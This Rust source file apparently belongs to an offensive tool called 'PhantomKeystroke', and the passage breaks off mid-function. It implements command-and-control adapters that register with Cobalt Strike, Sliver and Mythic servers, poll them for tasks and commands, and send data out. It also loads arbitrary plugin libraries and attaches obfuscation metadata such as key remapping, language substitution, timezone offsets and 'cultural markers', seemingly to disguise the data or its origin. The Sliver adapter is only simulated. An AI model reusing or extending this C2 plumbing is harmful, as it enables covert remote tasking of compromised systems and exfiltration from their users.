use std::path::{Path, PathBuf};
use std::time::Duration;
use std::sync::atomic::{AtomicU64, Ordering, AtomicBool};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use log::{info, error, warn, debug, trace};
use libloading::{Library, Symbol};
use reqwest;
use serde_json;
use std::sync::Arc;
use backoff::{ExponentialBackoff, backoff::Backoff};
use rand::Rng;
use std::collections::HashMap;
use crate::obfuscation::{KeyMapper, LanguageTransformer, TimestampEmulator};
use crate::input::Key;

const MAX_BUFFER_SIZE: usize = 1024 * 1024; // 1MB buffer size limit
const MAX_RETRY_ATTEMPTS: u32 = 3;
const RETRY_BASE_DELAY_MS: u64 = 100;

/// Interface for Command and Control (C2) adapters
/// 
/// This trait defines the core functionality that all plugin implementations must provide.
/// Plugins are responsible for managing communication with various C2 frameworks.
#[async_trait]
pub trait C2Adapter: Send + Sync {
    /// Initialize the adapter with configuration
    /// 
    /// This method is called once when the plugin is first loaded.
    /// It should establish any necessary connections and set up internal state.
    async fn initialize(&mut self, config: &PluginConfig) -> Result<(), Box<dyn std::error::Error>>;
    
    /// Receive data from the C2 server
    /// 
    /// This method is called periodically to check for new commands or data from the C2 server.
    /// It should return an empty Vec if no data is available.
    async fn receive(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
    
    /// Send data to the C2 server
    /// 
    /// This method is called when the application has data to send to the C2 server.
    /// It should handle any necessary encoding or formatting required by the C2 protocol.
    async fn send(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>>;
    
    /// Send data with transformation metadata to the C2 server
    /// 
    /// This enhanced method sends both the obfuscated data and the metadata needed
    /// to deobfuscate it on the receiving end.
    async fn send_with_metadata(&self, data: &[u8], _metadata: &TransformationMetadata) -> Result<(), Box<dyn std::error::Error>> {
        // Default implementation calls the regular send method (for backward compatibility)
        // Plugin implementations should override this to handle metadata transmission
        self.send(data).await
    }
    
    /// Get the plugin's name
    /// 
    /// Returns a unique identifier for this plugin implementation.
    fn name(&self) -> &str;
    
    /// Clean up resources when shutting down
    /// 
    /// This method is called when the application is shutting down.
    /// It should close any open connections and release all resources.
    async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>>;
}

/// Transformation metadata for obfuscation/deobfuscation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TransformationMetadata {
    /// Obfuscation scheme identifier (random, country-specific, etc.)
    pub scheme_id: String,
    
    /// Key mapping for character transformations (serialized mapping)
    pub key_mapping: HashMap<char, char>,
    
    /// Language transformation rules (serialized dictionary)
    pub language_dict: HashMap<String, String>,
    
    /// Timezone offset for timestamp manipulation
    pub timezone_offset: i32,
    
    /// Cultural fingerprints and behavioral patterns
    pub cultural_markers: HashMap<String, String>,
    
    /// Schema version for compatibility
    pub version: String,
}

impl TransformationMetadata {
    /// Create new metadata from components
    pub fn new(
        key_mapper: &KeyMapper,
        language_transformer: &LanguageTransformer,
        timestamp_emulator: &TimestampEmulator
    ) -> Self {
        // Extract key mappings
        let mut key_mapping = HashMap::new();
        for (k, v) in key_mapper.get_mapping() {
            if let (Key::Char(kc), Key::Char(vc)) = (k, v) {
                key_mapping.insert(*kc, *vc);
            }
        }
        
        TransformationMetadata {
            scheme_id: if language_transformer.is_rtl() { "rtl".to_string() } else { "ltr".to_string() },
            key_mapping,
            language_dict: language_transformer.get_dictionary().clone(),
            timezone_offset: timestamp_emulator.get_offset(),
            cultural_markers: HashMap::new(), // Can be populated as needed
            version: "1.0".to_string(),
        }
    }
    
    /// Serialize the metadata to bytes for transmission
    #[allow(dead_code)]
    pub fn to_bytes(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let serialized = serde_json::to_string(self)?;
        Ok(serialized.into_bytes())
    }
    
    /// Deserialize from bytes
    #[allow(dead_code)]
    pub fn from_bytes(bytes: &[u8]) -> Result<Self, Box<dyn std::error::Error>> {
        let serialized = String::from_utf8(bytes.to_vec())?;
        let metadata: TransformationMetadata = serde_json::from_str(&serialized)?;
        Ok(metadata)
    }
}

/// Plugin configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginConfig {
    /// Plugin name
    pub name: String,
    
    /// Plugin-specific configuration parameters
    #[serde(default)]
    pub parameters: std::collections::HashMap<String, String>,
}

/// Plugin type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PluginType {
    /// Null plugin (standalone terminal mode)
    Null,
    
    /// Cobalt Strike plugin
    CobaltStrike,
    
    /// Sliver plugin
    Sliver,
    
    /// Mythic plugin
    Mythic,
    
    /// Custom plugin
    Custom,
}

impl PluginType {
    /// Get a plugin type from a string
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "null" => Some(PluginType::Null),
            "cobaltstrike" => Some(PluginType::CobaltStrike),
            "sliver" => Some(PluginType::Sliver),
            "mythic" => Some(PluginType::Mythic),
            "custom" => Some(PluginType::Custom),
            _ => None,
        }
    }
    
    /// Get a string representation of the plugin type
    pub fn as_str(&self) -> &'static str {
        match self {
            PluginType::Null => "null",
            PluginType::CobaltStrike => "cobaltstrike",
            PluginType::Sliver => "sliver", 
            PluginType::Mythic => "mythic",
            PluginType::Custom => "custom",
        }
    }
}

/// Plugin manager
pub struct PluginManager {
    plugin: Box<dyn C2Adapter>,
    config: PluginConfig,
}

impl PluginManager {
    /// Create a new plugin manager with the specified plugin type
    pub async fn new(plugin_type: PluginType, config: Option<PluginConfig>) -> Result<Self, Box<dyn std::error::Error>> {
        let plugin: Box<dyn C2Adapter> = match plugin_type {
            PluginType::Null => Box::new(NullPlugin::new()),
            PluginType::CobaltStrike => {
                info!("Initializing Cobalt Strike plugin");
                Box::new(CobaltStrikePlugin::new())
            },
            PluginType::Sliver => {
                info!("Initializing Sliver plugin");
                Box::new(SliverPlugin::new())
            },
            PluginType::Mythic => {
                info!("Initializing Mythic plugin");
                Box::new(MythicPlugin::new())
            },
            PluginType::Custom => {
                // Load custom plugin from path in config
                if let Some(ref cfg) = config {
                    if let Some(path) = cfg.parameters.get("path") {
                        info!("Loading custom plugin from {}", path);
                        match Self::load_custom_plugin(&PathBuf::from(path)) {
                            Ok(p) => p,
                            Err(e) => {
                                error!("Failed to load custom plugin: {}", e);
                                warn!("Falling back to Null plugin");
                                Box::new(NullPlugin::new())
                            }
                        }
                    } else {
                        error!("No path specified for custom plugin");
                        warn!("Falling back to Null plugin");
                        Box::new(NullPlugin::new())
                    }
                } else {
                    error!("No configuration provided for custom plugin");
                    warn!("Falling back to Null plugin");
                    Box::new(NullPlugin::new())
                }
            },
        };
        
        let default_config = PluginConfig {
            name: plugin_type.as_str().to_string(),
            parameters: std::collections::HashMap::new(),
        };
        
        let config = config.unwrap_or(default_config);
        
        let mut manager = PluginManager {
            plugin,
            config,
        };
        
        // Initialize the plugin
        match manager.plugin.initialize(&manager.config).await {
            Ok(_) => {
                info!("Successfully initialized plugin: {}", manager.plugin.name());
            },
            Err(e) => {
                error!("Error initializing plugin: {}", e);
                // Continue despite initialization error - the plugin might still work partially
            }
        }
        
        Ok(manager)
    }
    
    /// Get a reference to the active plugin
    pub fn plugin(&self) -> &dyn C2Adapter {
        self.plugin.as_ref()
    }
    
    /// Get mutable access to the plugin
    #[allow(dead_code)]
    pub fn plugin_mut(&mut self) -> &mut dyn C2Adapter {
        &mut *self.plugin
    }
    
    /// Get the plugin configuration
    #[allow(dead_code)]
    pub fn config(&self) -> &PluginConfig {
        &self.config
    }
    
    /// Clean up resources when shutting down
    #[allow(dead_code)]
    pub async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>> {
        self.plugin.cleanup().await
    }

    /// Load a custom plugin from a dynamic library
    pub fn load_custom_plugin(path: &Path) -> Result<Box<dyn C2Adapter>, Box<dyn std::error::Error>> {
        debug!("Attempting to load custom plugin from: {}", path.display());
        if !path.exists() {
            return Err(format!("Plugin file not found: {}", path.display()).into());
        }

        // Load the dynamic library
        let lib = unsafe { 
            match Library::new(path) {
                Ok(lib) => lib,
                Err(e) => {
                    error!("Failed to load library: {}", e);
                    return Err(format!("Failed to load dynamic library: {}", e).into());
                }
            }
        };
        
        // Get the create_plugin function
        let func: Symbol<fn() -> *mut dyn C2Adapter> = unsafe {
            match lib.get(b"create_plugin") {
                Ok(f) => f,
                Err(e) => {
                    error!("Failed to get create_plugin function: {}", e);
                    return Err(format!("Failed to find 'create_plugin' function in the library: {}", e).into());
                }
            }
        };
        
        // Call the function to create the plugin
        let raw_plugin = func();
        if raw_plugin.is_null() {
            return Err("Plugin creation function returned a null pointer".into());
        }
        
        // Convert the raw pointer to a Box
        let plugin = unsafe { Box::from_raw(raw_plugin) };
        debug!("Successfully loaded custom plugin: {}", plugin.name());
        
        // Return the plugin
        Ok(plugin)
    }
}

/// Null plugin (standalone terminal mode)
pub struct NullPlugin {
    name: String,
    _buffer: Vec<u8>,
}

impl NullPlugin {
    /// Create a new null plugin
    pub fn new() -> Self {
        NullPlugin {
            name: "null_plugin".to_string(),
            _buffer: Vec::new(),
        }
    }
}

#[async_trait]
impl C2Adapter for NullPlugin {
    async fn initialize(&mut self, _config: &PluginConfig) -> Result<(), Box<dyn std::error::Error>> {
        info!("Initializing Null plugin (terminal mode)");
        Ok(())
    }
    
    async fn receive(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // In null plugin, we don't actually receive anything
        // This would be handled directly by the input module
        trace!("Null plugin receive() called - no action taken");
        Ok(Vec::new())
    }
    
    async fn send(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        // In null plugin, we don't actually send anything
        // This would be handled directly by the output module
        trace!("Null plugin send() called with {} bytes - no action taken", data.len());
        Ok(())
    }
    
    fn name(&self) -> &str {
        &self.name
    }
    
    async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Cleaning up Null plugin");
        Ok(())
    }
}

/// Cobalt Strike plugin implementation
pub struct CobaltStrikePlugin {
    name: String,
    endpoint: String,
    client: reqwest::Client,
    buffer: std::sync::Mutex<Vec<u8>>,
    connection_state: Arc<AtomicBool>,
    retry_count: std::sync::Mutex<u32>,
}

impl CobaltStrikePlugin {
    /// Create a new Cobalt Strike plugin
    pub fn new() -> Self {
        CobaltStrikePlugin {
            name: "cobaltstrike_plugin".to_string(),
            endpoint: "http://localhost:50050".to_string(),
            client: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .build()
                .unwrap_or_default(),
            buffer: std::sync::Mutex::new(Vec::new()),
            connection_state: Arc::new(AtomicBool::new(false)),
            retry_count: std::sync::Mutex::new(0),
        }
    }
    
    /// Helper method to create a backoff strategy for retries
    fn create_backoff() -> ExponentialBackoff {
        ExponentialBackoff {
            initial_interval: Duration::from_millis(RETRY_BASE_DELAY_MS),
            max_interval: Duration::from_secs(5),
            multiplier: 2.0,
            max_elapsed_time: Some(Duration::from_secs(30)),
            ..ExponentialBackoff::default()
        }
    }
    
    /// Helper method to safely add data to the buffer with size limits
    fn add_to_buffer(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.extend_from_slice(data);
            
            // Keep buffer at a reasonable size to prevent memory leaks
            if buffer.len() > MAX_BUFFER_SIZE {
                debug!("Trimming Cobalt Strike buffer to prevent overflow");
                let new_start = buffer.len().saturating_sub(MAX_BUFFER_SIZE);
                buffer.drain(0..new_start);  // Keep only the most recent data
            }
            
            Ok(())
        } else {
            Err("Failed to lock buffer for logging".into())
        }
    }
}

#[async_trait]
impl C2Adapter for CobaltStrikePlugin {
    async fn initialize(&mut self, config: &PluginConfig) -> Result<(), Box<dyn std::error::Error>> {
        info!("Initializing Cobalt Strike plugin");
        
        // Get endpoint from config if specified
        if let Some(endpoint) = config.parameters.get("endpoint") {
            self.endpoint = endpoint.clone();
            debug!("Using Cobalt Strike endpoint: {}", self.endpoint);
        }
        
        // Reset retry count
        if let Ok(mut count) = self.retry_count.lock() {
            *count = 0;
        }
        
        // Try to register with the External C2 server
        debug!("Attempting to register with Cobalt Strike External C2");
        
        let mut backoff = Self::create_backoff();
        let mut attempt = 0;
        let mut success = false;
        
        loop {
            attempt += 1;
            
            match self.client.post(&format!("{}/register", self.endpoint))
                .json(&serde_json::json!({
                    "name": "PhantomKeystroke",
                    "type": "external_c2"
                }))
                .send()
                .await {
                    Ok(response) => {
                        if response.status().is_success() {
                            info!("Successfully connected to Cobalt Strike External C2 at {}", self.endpoint);
                            self.connection_state.store(true, Ordering::SeqCst);
                            success = true;
                            break;
                        } else {
                            let status = response.status();
                            let error_text = response.text().await.unwrap_or_default();
                            warn!("Failed to register with Cobalt Strike: {} - {}", status, error_text);
                        }
                    },
                    Err(e) => {
                        warn!("Failed to connect to Cobalt Strike: {}", e);
                    }
                }
            
            // Check if we should retry
            if attempt >= MAX_RETRY_ATTEMPTS {
                warn!("Max retry attempts ({}) reached for Cobalt Strike initialization", MAX_RETRY_ATTEMPTS);
                break;
            }
            
            // Wait before retrying
            if let Some(backoff_duration) = backoff.next_backoff() {
                debug!("Retrying Cobalt Strike connection in {:?} (attempt {}/{})", 
                      backoff_duration, attempt, MAX_RETRY_ATTEMPTS);
                tokio::time::sleep(backoff_duration).await;
            } else {
                break;
            }
        }
        
        // Log warning but don't fail
        if !success {
            warn!("Initialization completed with warnings - continuing in degraded mode");
        }
        
        Ok(())
    }
    
    async fn receive(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Skip if we know we're not connected
        if !self.connection_state.load(Ordering::SeqCst) {
            trace!("Skipping receive - not connected to Cobalt Strike");
            return Ok(Vec::new());
        }
        
        // Make an HTTP request to the External C2 server to check for pending tasks
        debug!("Checking for tasks from Cobalt Strike at {}", self.endpoint);
        match self.client.get(&format!("{}/tasks", self.endpoint))
            .timeout(Duration::from_secs(5))  // Shorter timeout for polling
            .send()
            .await {
                Ok(response) => {
                    if response.status().is_success() {
                        let data = response.bytes().await?;
                        if !data.is_empty() {
                            info!("Received {} bytes from Cobalt Strike External C2", data.len());
                            // Reset retry count on successful receive
                            if let Ok(mut count) = self.retry_count.lock() {
                                *count = 0;
                            }
                            return Ok(data.to_vec());
                        }
                    } else if response.status() != reqwest::StatusCode::NO_CONTENT {
                        // Only log an error if it's not just "no content"
                        warn!("Failed to receive data: {}", response.status());
                        if let Ok(text) = response.text().await {
                            debug!("Error response: {}", text);
                        }
                    }
                },
                Err(e) => {
                    // Only log timeout errors at debug level since they're common during polling
                    if e.is_timeout() {
                        debug!("Timeout while polling Cobalt Strike: {}", e);
                    } else {
                        // Increment retry count on error
                        if let Ok(mut count) = self.retry_count.lock() {
                            *count += 1;
                            if *count >= MAX_RETRY_ATTEMPTS {
                                warn!("Connection errors with Cobalt Strike for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                                self.connection_state.store(false, Ordering::SeqCst);
                                *count = 0;
                            }
                        }
                        warn!("Connection error with Cobalt Strike: {}", e);
                    }
                }
            }
        
        // Return empty data if no tasks or error
        Ok(Vec::new())
    }
    
    async fn send(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        // Skip if we know we're not connected
        if !self.connection_state.load(Ordering::SeqCst) {
            warn!("Cannot send data - not connected to Cobalt Strike");
            return Ok(());
        }
        
        // Send the data to the External C2 server
        info!("Sending {} bytes to Cobalt Strike External C2", data.len());
        
        let mut backoff = Self::create_backoff();
        let mut attempt = 0;
        let mut success = false;
        
        loop {
            attempt += 1;
            
            match self.client.post(&format!("{}/send", self.endpoint))
                .body(data.to_vec())
                .send()
                .await {
                    Ok(response) => {
                        if response.status().is_success() {
                            debug!("Successfully sent data to Cobalt Strike");
                            
                            // Add to buffer for logging/debugging
                            if let Err(e) = self.add_to_buffer(data) {
                                debug!("Failed to add to buffer: {}", e);
                            }
                            
                            // Reset retry count on successful send
                            if let Ok(mut count) = self.retry_count.lock() {
                                *count = 0;
                            }
                            
                            success = true;
                            break;
                        } else {
                            let status = response.status();
                            let error_text = response.text().await.unwrap_or_default();
                            warn!("Failed to send data: {} - {}", status, error_text);
                            
                            // Increment retry count on API error
                            if let Ok(mut count) = self.retry_count.lock() {
                                *count += 1;
                                if *count >= MAX_RETRY_ATTEMPTS {
                                    warn!("API errors with Cobalt Strike for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                                    self.connection_state.store(false, Ordering::SeqCst);
                                    *count = 0;
                                }
                            }
                        }
                    },
                    Err(e) => {
                        // Log but don't fail on connection errors
                        warn!("Connection error while sending to Cobalt Strike: {}", e);
                        
                        // Increment retry count on error
                        if let Ok(mut count) = self.retry_count.lock() {
                            *count += 1;
                            if *count >= MAX_RETRY_ATTEMPTS {
                                warn!("Connection errors with Cobalt Strike for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                                self.connection_state.store(false, Ordering::SeqCst);
                                *count = 0;
                            }
                        }
                    }
                }
            
            // Check if we should retry
            if attempt >= MAX_RETRY_ATTEMPTS || success {
                if !success {
                    warn!("Max retry attempts ({}) reached for sending data to Cobalt Strike", MAX_RETRY_ATTEMPTS);
                }
                break;
            }
            
            // Wait before retrying
            if let Some(backoff_duration) = backoff.next_backoff() {
                debug!("Retrying Cobalt Strike send in {:?} (attempt {}/{})", 
                      backoff_duration, attempt, MAX_RETRY_ATTEMPTS);
                tokio::time::sleep(backoff_duration).await;
            } else {
                break;
            }
        }
        
        if !success {
            warn!("Failed to send data to Cobalt Strike after {} attempts", attempt);
        }
        
        // Don't return an error, just log it
        Ok(())
    }
    
    fn name(&self) -> &str {
        &self.name
    }
    
    async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Cleaning up Cobalt Strike plugin");
        
        // Only try to unregister if we think we're connected
        if self.connection_state.load(Ordering::SeqCst) {
            // Try to unregister from the External C2 server
            debug!("Attempting to unregister from Cobalt Strike");
            match self.client.post(&format!("{}/unregister", self.endpoint))
                .send()
                .await {
                    Ok(response) => {
                        if !response.status().is_success() {
                            warn!("Failed to unregister from Cobalt Strike: {}", response.status());
                        } else {
                            info!("Successfully unregistered from Cobalt Strike");
                        }
                    },
                    Err(e) => {
                        warn!("Connection error during unregistration: {}", e);
                    }
                }
            
            // Update connection state
            self.connection_state.store(false, Ordering::SeqCst);
        }
        
        // Clear the buffer
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.clear();
            debug!("Cleared Cobalt Strike buffer");
        } else {
            warn!("Failed to lock buffer for clearing");
        }
        
        Ok(())
    }
}

/// Sliver plugin implementation
pub struct SliverPlugin {
    name: String,
    address: String,
    token: Option<String>,
    buffer: std::sync::Mutex<Vec<u8>>,
    connected: Arc<AtomicBool>,
    retry_count: std::sync::Mutex<u32>,
}

impl SliverPlugin {
    /// Create a new Sliver plugin
    pub fn new() -> Self {
        SliverPlugin {
            name: "sliver_plugin".to_string(),
            address: "localhost:31337".to_string(),
            token: None,
            buffer: std::sync::Mutex::new(Vec::new()),
            connected: Arc::new(AtomicBool::new(false)),
            retry_count: std::sync::Mutex::new(0),
        }
    }
    
    /// Helper method to create a backoff strategy for retries
    fn create_backoff() -> ExponentialBackoff {
        ExponentialBackoff {
            initial_interval: Duration::from_millis(RETRY_BASE_DELAY_MS),
            max_interval: Duration::from_secs(5),
            multiplier: 2.0,
            max_elapsed_time: Some(Duration::from_secs(30)),
            ..ExponentialBackoff::default()
        }
    }
    
    /// Helper method to safely add data to the buffer with size limits
    fn add_to_buffer(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.extend_from_slice(data);
            
            // Keep buffer at a reasonable size
            if buffer.len() > MAX_BUFFER_SIZE {
                debug!("Trimming Sliver buffer to prevent overflow");
                let new_start = buffer.len().saturating_sub(MAX_BUFFER_SIZE);
                buffer.drain(0..new_start);
            }
            
            Ok(())
        } else {
            Err("Failed to lock buffer for logging".into())
        }
    }

    async fn simulate_connection_attempt(&self) -> Result<(), String> {
        // For simulation purposes, randomly fail some connection attempts
        // This would be a real connection in production code
        if rand::thread_rng().gen_bool(0.3) {
            Err("Simulated connection failure".to_string())
        } else {
            Ok(())
        }
    }
}

#[async_trait]
impl C2Adapter for SliverPlugin {
    async fn initialize(&mut self, config: &PluginConfig) -> Result<(), Box<dyn std::error::Error>> {
        info!("Initializing Sliver plugin");
        
        // Reset retry count
        if let Ok(mut count) = self.retry_count.lock() {
            *count = 0;
        }
        
        if let Some(address) = config.parameters.get("address") {
            self.address = address.clone();
            debug!("Using Sliver server address: {}", self.address);
        }
        
        if let Some(token) = config.parameters.get("token") {
            self.token = Some(token.clone());
            debug!("Using authentication token for Sliver connection");
        }
        
        // In a production implementation, we would establish a WebSocket connection here
        // Simulate a connection attempt with retries
        let mut backoff = Self::create_backoff();
        let mut attempt = 0;
        
        debug!("Attempting to connect to Sliver server at {}", self.address);
        
        loop {
            attempt += 1;
            
            // Simulate a connection attempt 
            tokio::time::sleep(Duration::from_millis(100)).await;
            
            match self.simulate_connection_attempt().await {
                Ok(_) => {
                    // Success
                    self.connected.store(true, Ordering::SeqCst);
                    info!("Connected to Sliver server at {}", self.address);
                    return Ok(());
                },
                Err(e) => {
                    warn!("Simulated connection failure to Sliver server: {}", e);
                    
                    // Check if we should retry
                    if attempt >= MAX_RETRY_ATTEMPTS {
                        warn!("Max retry attempts ({}) reached for Sliver initialization", MAX_RETRY_ATTEMPTS);
                        break;
                    }
                    
                    // Wait before retrying
                    if let Some(backoff_duration) = backoff.next_backoff() {
                        debug!("Retrying Sliver connection in {:?} (attempt {}/{})", 
                              backoff_duration, attempt, MAX_RETRY_ATTEMPTS);
                        tokio::time::sleep(backoff_duration).await;
                    } else {
                        break;
                    }
                }
            }
        }
        
        // For simulation, set connected to true regardless of "errors"
        // In production, this would remain false if all connection attempts failed
        self.connected.store(true, Ordering::SeqCst);
        
        info!("Connected to Sliver server at {}", self.address);
        Ok(())
    }
    
    async fn receive(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Check if we're connected
        if !self.connected.load(Ordering::SeqCst) {
            debug!("Not connected to Sliver server, cannot receive data");
            return Ok(Vec::new());
        }
        
        // In a production implementation, we would check for messages on the WebSocket
        // For now, just return empty data
        trace!("Checking for data from Sliver server (not fully implemented)");
        
        // Reset retry count on successful receive call
        if let Ok(mut count) = self.retry_count.lock() {
            *count = 0;
        }
        
        Ok(Vec::new())
    }
    
    async fn send(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        // Check if we're connected
        if !self.connected.load(Ordering::SeqCst) {
            warn!("Not connected to Sliver server, cannot send data");
            return Ok(());
        }
        
        // In a production implementation, we would send data over the WebSocket
        info!("Sending {} bytes to Sliver server at {}", data.len(), self.address);
        
        // Add to buffer for logging/debugging
        if let Err(e) = self.add_to_buffer(data) {
            debug!("Failed to add to buffer: {}", e);
        }
        
        // Reset retry count on successful send
        if let Ok(mut count) = self.retry_count.lock() {
            *count = 0;
        }
        
        Ok(())
    }
    
    fn name(&self) -> &str {
        &self.name
    }
    
    async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Cleaning up Sliver plugin");
        
        // Only attempt cleanup if connected
        if self.connected.load(Ordering::SeqCst) {
            // In a production implementation, we would close the WebSocket connection
            self.connected.store(false, Ordering::SeqCst);
            info!("Disconnected from Sliver server at {}", self.address);
        }
        
        // Clear the buffer
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.clear();
            debug!("Cleared Sliver buffer");
        } else {
            warn!("Failed to lock buffer for clearing");
        }
        
        Ok(())
    }
}

/// Mythic plugin implementation
pub struct MythicPlugin {
    name: String,
    url: String,
    api_key: Option<String>,
    callback_uuid: Option<String>,
    client: reqwest::Client,
    buffer: std::sync::Mutex<Vec<u8>>,
    // Using AtomicU64 to store timestamp for thread-safety
    last_check_time: AtomicU64,
    connection_state: Arc<AtomicBool>,
    retry_count: std::sync::Mutex<u32>,
}

impl MythicPlugin {
    /// Create a new Mythic plugin
    pub fn new() -> Self {
        MythicPlugin {
            name: "mythic_plugin".to_string(),
            url: "http://localhost:7443".to_string(),
            api_key: None,
            callback_uuid: None,
            client: reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(30))
                .build()
                .unwrap_or_default(),
            buffer: std::sync::Mutex::new(Vec::new()),
            // Initialize with current time
            last_check_time: AtomicU64::new(
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
            ),
            connection_state: Arc::new(AtomicBool::new(false)),
            retry_count: std::sync::Mutex::new(0),
        }
    }
    
    /// Helper method to check if enough time has elapsed since last check
    fn should_check_for_tasks(&self) -> bool {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
            
        let last = self.last_check_time.load(Ordering::Relaxed);
        
        // If more than 3 seconds have passed, update last check time and return true
        if now - last >= 3 {
            self.last_check_time.store(now, Ordering::Relaxed);
            return true;
        }
        
        false
    }
    
    /// Helper method to create a backoff strategy for retries
    fn create_backoff() -> ExponentialBackoff {
        ExponentialBackoff {
            initial_interval: Duration::from_millis(RETRY_BASE_DELAY_MS),
            max_interval: Duration::from_secs(5),
            multiplier: 2.0,
            max_elapsed_time: Some(Duration::from_secs(30)),
            ..ExponentialBackoff::default()
        }
    }
    
    /// Helper method to safely add data to the buffer with size limits
    fn add_to_buffer(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.extend_from_slice(data);
            
            // Keep buffer at a reasonable size
            if buffer.len() > MAX_BUFFER_SIZE {
                debug!("Trimming Mythic buffer to prevent overflow");
                let new_start = buffer.len().saturating_sub(MAX_BUFFER_SIZE);
                buffer.drain(0..new_start);
            }
            
            Ok(())
        } else {
            Err("Failed to lock buffer for logging".into())
        }
    }
}

#[async_trait]
impl C2Adapter for MythicPlugin {
    async fn initialize(&mut self, config: &PluginConfig) -> Result<(), Box<dyn std::error::Error>> {
        info!("Initializing Mythic plugin");
        
        // Reset retry count
        if let Ok(mut count) = self.retry_count.lock() {
            *count = 0;
        }
        
        // Get configuration
        if let Some(url) = config.parameters.get("url") {
            self.url = url.clone();
            debug!("Using Mythic URL: {}", self.url);
        }
        
        if let Some(api_key) = config.parameters.get("api_key") {
            self.api_key = Some(api_key.clone());
            debug!("Configured Mythic API key");
        }
        
        if let Some(callback_uuid) = config.parameters.get("callback_uuid") {
            self.callback_uuid = Some(callback_uuid.clone());
            debug!("Using existing callback UUID: {}", callback_uuid);
        } else if let Some(_payload_uuid) = config.parameters.get("payload_uuid") {
            // If we have a payload UUID but no callback UUID, we would register a new callback
            debug!("Payload UUID provided, would register a new callback");
            // Real implementation would create a callback here
        }
        
        if self.api_key.is_none() {
            warn!("No API key provided for Mythic plugin");
        }
        
        if self.callback_uuid.is_none() {
            warn!("No callback UUID provided for Mythic plugin");
        }
        
        if self.api_key.is_some() && self.callback_uuid.is_some() {
            // Verify we can connect to the Mythic API with retries
            let mut backoff = Self::create_backoff();
            let mut attempt = 0;
            
            debug!("Verifying connection to Mythic API at {}", self.url);
            
            loop {
                attempt += 1;
                
                match self.client.get(&format!("{}/api/v1.4/health", self.url))
                    .send()
                    .await {
                        Ok(response) => {
                            if response.status().is_success() {
                                info!("Successfully connected to Mythic API at {}", self.url);
                                self.connection_state.store(true, Ordering::SeqCst);
                                return Ok(());
                            } else {
                                let status = response.status();
                                warn!("Connected to Mythic but received error status: {}", status);
                            }
                        },
                        Err(e) => {
                            warn!("Failed to connect to Mythic API: {}", e);
                        }
                    }
                
                // Check if we should retry
                if attempt >= MAX_RETRY_ATTEMPTS {
                    warn!("Max retry attempts ({}) reached for Mythic initialization", MAX_RETRY_ATTEMPTS);
                    break;
                }
                
                // Wait before retrying
                if let Some(backoff_duration) = backoff.next_backoff() {
                    debug!("Retrying Mythic connection in {:?} (attempt {}/{})", 
                          backoff_duration, attempt, MAX_RETRY_ATTEMPTS);
                    tokio::time::sleep(backoff_duration).await;
                } else {
                    break;
                }
            }
        }
        
        // Log warning but don't fail
        warn!("Mythic plugin not fully configured or connection failed, some features may not work");
        
        Ok(())
    }
    
    async fn receive(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // If not fully configured, just return empty data
        if self.api_key.is_none() || self.callback_uuid.is_none() {
            trace!("Mythic plugin not fully configured, skipping receive check");
            return Ok(Vec::new());
        }
        
        // Skip if we know we're not connected
        if !self.connection_state.load(Ordering::SeqCst) {
            trace!("Skipping receive - not connected to Mythic");
            return Ok(Vec::new());
        }
        
        // Check if we're due for a task check (once every 3 seconds)
        if !self.should_check_for_tasks() {
            trace!("Skipping Mythic task check (checked recently)");
            return Ok(Vec::new());
        }
        
        debug!("Checking for tasks from Mythic");
        // Try to get tasks from Mythic
        match self.client.get(&format!(
            "{}/api/v1.4/tasks/callback/{}",
            self.url,
            self.callback_uuid.as_ref().unwrap()
        ))
        .header("apitoken", self.api_key.as_ref().unwrap())
        .send()
        .await {
            Ok(response) => {
                if response.status().is_success() {
                    // Reset retry count on successful response
                    if let Ok(mut count) = self.retry_count.lock() {
                        *count = 0;
                    }
                    
                    match response.json::<serde_json::Value>().await {
                        Ok(json) => {
                            // Check if we have a valid response
                            if let Some(status) = json.get("status").and_then(|s| s.as_str()) {
                                if status == "success" {
                                    if let Some(data) = json.get("response") {
                                        if let Some(tasks) = data.as_array() {
                                            if !tasks.is_empty() {
                                                // Process the first task
                                                if let Some(task) = tasks.first() {
                                                    if let Some(command) = task.get("command").and_then(|c| c.as_str()) {
                                                        info!("Received task with command: {}", command);
                                                        
                                                        // Return the command as bytes
                                                        return Ok(command.as_bytes().to_vec());
                                                    }
                                                }
                                            } else {
